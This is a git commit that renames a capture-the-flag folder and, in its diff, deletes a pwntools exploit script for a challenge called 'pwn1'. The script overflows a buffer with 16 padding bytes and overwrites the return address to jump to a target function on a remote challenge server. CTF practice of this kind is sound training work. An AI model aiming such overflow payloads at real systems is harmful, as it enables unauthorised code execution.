9c530c4cfe0a456af814aa078f89ae232483fcbd
aFish <tako0903@icloud.com>
2019-02-01 23:38:01 +0800

    rename eof2019 > eof2018

--- eof_2019/pwn1/exp.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-p = remote('10.140.0.8', 11111)
-#p = process('./pwn1')
-offset = 'a' * 16
-target_addr = 0x04005fb
-payload = offset + p64(target_addr)
-p.sendline(payload)
-p.interactive()
